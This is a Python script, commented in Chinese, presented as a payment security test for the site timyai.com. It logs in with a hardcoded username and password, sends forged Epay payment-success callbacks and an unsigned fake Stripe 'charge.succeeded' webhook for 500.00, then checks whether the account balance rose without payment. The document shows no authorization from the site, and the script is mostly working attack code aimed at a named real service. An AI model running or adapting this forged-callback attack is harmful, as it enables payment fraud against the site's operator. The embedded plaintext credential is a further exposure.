#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 支付接口安全测试脚本
"""

import requests
import json
import time

# 目标配置
TARGET_URL = "http://timyai.com"
TEST_USERNAME = "antplayer"
TEST_PASSWORD = "sjh@101709"

class TimyaiTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        })
        self.token = None
        self.user_id = None
        
    def login(self):
        """登录测试账号"""
        print("[+] 尝试登录...")
        url = f"{TARGET_URL}/api/user/login"
        data = {
            "username": TEST_USERNAME,
            "password": TEST_PASSWORD
        }
        
        try:
            response = self.session.post(url, json=data, timeout=10)
            print(f"    登录响应状态码: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                print(f"    响应内容: {json.dumps(result, ensure_ascii=False)[:200]}")
                
                # 尝试从响应中获取 token
                if "data" in result:
                    token_data = result.get("data", {})
                    if isinstance(token_data, dict):
                        self.token = token_data.get("token") or token_data.get("access_token")
                        self.user_id = token_data.get("id") or token_data.get("user_id")
                    elif isinstance(token_data, str):
                        self.token = token_data
                
                # 如果 token 在其他地方，尝试其他方式
                if not self.token:
                    if result.get("token"):
                        self.token = result["token"]
                
                if self.token:
                    print(f"    ✅ 登录成功! Token: {self.token[:20]}...")
                    return True
                else:
                    print(f"    响应结构: {list(result.keys())}")
            else:
                print(f"    ❌ 登录失败")
                
        except Exception as e:
            print(f"    ❌ 登录请求失败: {e}")
        
        return False
    
    def get_user_info(self):
        """获取用户信息"""
        if not self.token:
            print("[-] 未登录，无法获取用户信息")
            return None
            
        print("\n[+] 获取用户信息...")
        url = f"{TARGET_URL}/api/user/self"
        headers = {"Authorization": f"Bearer {self.token}"}
        
        try:
            response = self.session.get(url, headers=headers, timeout=10)
            print(f"    响应状态码: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                print(f"    用户信息: {json.dumps(result, ensure_ascii=False)[:300]}")
                
                if "data" in result:
                    user_data = result["data"]
                    self.user_id = user_data.get("id")
                    print(f"    ✅ 获取用户信息成功! 用户ID: {self.user_id}")
                    return user_data
            else:
                print(f"    ❌ 获取用户信息失败")
                
        except Exception as e:
            print(f"    ❌ 获取用户信息请求失败: {e}")
        
        return None
    
    def get_user_balance(self):
        """获取用户余额"""
        if not self.token:
            return None
            
        print("\n[+] 获取用户余额...")
        url = f"{TARGET_URL}/api/data/self"
        headers = {"Authorization": f"Bearer {self.token}"}
        
        try:
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                result = response.json()
                print(f"    余额信息: {json.dumps(result, ensure_ascii=False)[:300]}")
                return result
        except Exception as e:
            print(f"    ❌ 获取余额失败: {e}")
        
        return None
    
    def test_payment_endpoints(self):
        """测试支付相关接口"""
        if not self.token:
            print("[-] 未登录，无法测试支付接口")
            return {}
            
        print("\n[+] 开始测试支付相关接口...")
        results = {}
        
        # 测试易支付回调接口
        print("\n  > 测试 Epay 回调接口...")
        
        # 生成伪造的订单号
        import random
        import string
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        fake_trade_no = f"SUBUSR{self.user_id}NO{random_str}{int(time.time())}"
        
        # 测试 GET 请求
        epay_get_params = {
            "trade_no": fake_trade_no,
            "status": "success",
            "amount": "500.00",
            "param": f"user_id_{self.user_id}",
            "time": str(int(time.time())),
            "type": "alipay",
        }
        
        epay_endpoints = [
            "/api/user/epay/notify",
            "/api/subscription/epay/notify",
        ]
        
        for endpoint in epay_endpoints:
            url = f"{TARGET_URL}{endpoint}"
            print(f"\n    测试: GET {endpoint}")
            
            try:
                response = self.session.get(url, params=epay_get_params, timeout=10)
                print(f"    状态码: {response.status_code}")
                print(f"    响应: {response.text[:100]}")
                
                results[endpoint] = {
                    "method": "GET",
                    "status_code": response.status_code,
                    "response": response.text,
                    "vulnerable": response.status_code == 200 and response.text.strip() in ["success", "SUCCESS", "ok", "OK"]
                }
                
                if results[endpoint]["vulnerable"]:
                    print(f"    ⚠️  可能存在漏洞!")
                
            except Exception as e:
                print(f"    错误: {e}")
                results[endpoint] = {"error": str(e)}
        
        # 测试 POST 请求
        for endpoint in epay_endpoints:
            url = f"{TARGET_URL}{endpoint}"
            print(f"\n    测试: POST {endpoint}")
            
            try:
                response = self.session.post(url, data=epay_get_params, timeout=10)
                print(f"    状态码: {response.status_code}")
                print(f"    响应: {response.text[:100]}")
                
                results[f"{endpoint}_POST"] = {
                    "method": "POST",
                    "status_code": response.status_code,
                    "response": response.text,
                    "vulnerable": response.status_code == 200 and response.text.strip() in ["success", "SUCCESS", "ok", "OK"]
                }
                
                if results[f"{endpoint}_POST"]["vulnerable"]:
                    print(f"    ⚠️  可能存在漏洞!")
                
            except Exception as e:
                print(f"    错误: {e}")
                results[f"{endpoint}_POST"] = {"error": str(e)}
        
        return results
    
    def test_stripe_webhook(self):
        """测试 Stripe webhook"""
        print("\n  > 测试 Stripe Webhook...")
        
        fake_event = {
            "id": f"evt_test_{int(time.time())}",
            "object": "event",
            "api_version": "2020-08-27",
            "created": int(time.time()),
            "data": {
                "object": {
                    "id": f"ch_test_{int(time.time())}",
                    "object": "charge",
                    "amount": 50000,  # 500.00 美元
                    "currency": "usd",
                    "status": "succeeded",
                    "customer": f"cus_test_{self.user_id}",
                    "metadata": {
                        "user_id": str(self.user_id),
                    }
                }
            },
            "type": "charge.succeeded",
            "livemode": False,
            "pending_webhooks": 0,
        }
        
        url = f"{TARGET_URL}/api/stripe/webhook"
        
        try:
            response = self.session.post(url, json=fake_event, timeout=10)
            print(f"    状态码: {response.status_code}")
            print(f"    响应: {response.text[:100]}")
            
            return {
                "status_code": response.status_code,
                "response": response.text,
                "vulnerable": response.status_code == 200
            }
        except Exception as e:
            print(f"    错误: {e}")
            return {"error": str(e)}
    
    def run_full_test(self):
        """运行完整测试"""
        print("="*60)
        print("timyai.com 支付接口安全测试")
        print("="*60)
        print(f"目标: {TARGET_URL}")
        print(f"测试账号: {TEST_USERNAME}")
        print("="*60)
        
        # 1. 登录
        if not self.login():
            print("\n[-] 登录失败，测试终止")
            return
        
        # 2. 获取用户信息
        user_info = self.get_user_info()
        
        # 3. 获取用户余额
        self.get_user_balance()
        
        # 4. 测试支付接口
        print("\n[+] 开始支付接口测试...")
        
        # 4.1 测试易支付回调
        epay_results = self.test_payment_endpoints()
        
        # 4.2 测试 Stripe webhook
        stripe_result = self.test_stripe_webhook()
        
        # 5. 再次检查余额，确认是否有变化
        print("\n[+] 再次获取余额，确认是否有未授权增加...")
        self.get_user_balance()
        
        # 6. 输出总结
        print("\n" + "="*60)
        print("测试结果总结")
        print("="*60)
        
        vulnerable_count = 0
        
        print("\n易支付接口测试结果:")
        for endpoint, result in epay_results.items():
            if isinstance(result, dict):
                if "error" in result:
                    print(f"  {endpoint}: ❌ 连接错误")
                else:
                    status = "⚠️  可能存在漏洞" if result.get("vulnerable") else "✅ 安全"
                    print(f"  {endpoint}: {status} (状态码: {result.get('status_code')})")
                    if result.get("vulnerable"):
                        vulnerable_count += 1
        
        print("\nStripe Webhook 测试结果:")
        if isinstance(stripe_result, dict):
            if "error" in stripe_result:
                print(f"  Stripe: ❌ 连接错误")
            else:
                status = "⚠️  可能存在漏洞" if stripe_result.get("vulnerable") else "✅ 安全"
                print(f"  Stripe: {status} (状态码: {stripe_result.get('status_code')})")
                if stripe_result.get("vulnerable"):
                    vulnerable_count += 1
        
        print("\n" + "="*60)
        print(f"发现可能存在漏洞的接口数量: {vulnerable_count}")
        print("="*60)
        
        return {
            "epay_results": epay_results,
            "stripe_result": stripe_result
        }


if __name__ == "__main__":
    test = TimyaiTest()
    results = test.run_full_test()
    
    # 保存结果
    with open("timyai_test_results.json", "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print("\n结果已保存到: timyai_test_results.json")